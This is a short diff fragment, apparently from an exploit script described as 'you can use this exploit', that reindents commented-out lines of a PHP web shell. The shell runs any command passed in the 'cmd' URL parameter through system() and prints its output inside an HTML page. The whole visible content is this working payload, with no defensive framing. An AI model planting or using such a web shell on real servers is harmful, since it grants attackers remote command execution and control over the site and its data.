@@ -22,10 +22,10 @@ you can use this exploit
 # </form>
 # <pre>
 # <?php
-    # if(isset($_GET['cmd']))
-    # {
-        #system($_GET['cmd'] . ' 2>&1');
-    #}
+# if(isset($_GET['cmd']))
+# {
+#system($_GET['cmd'] . ' 2>&1');
+#}
 # ?>
 # </pre>
 # </body>
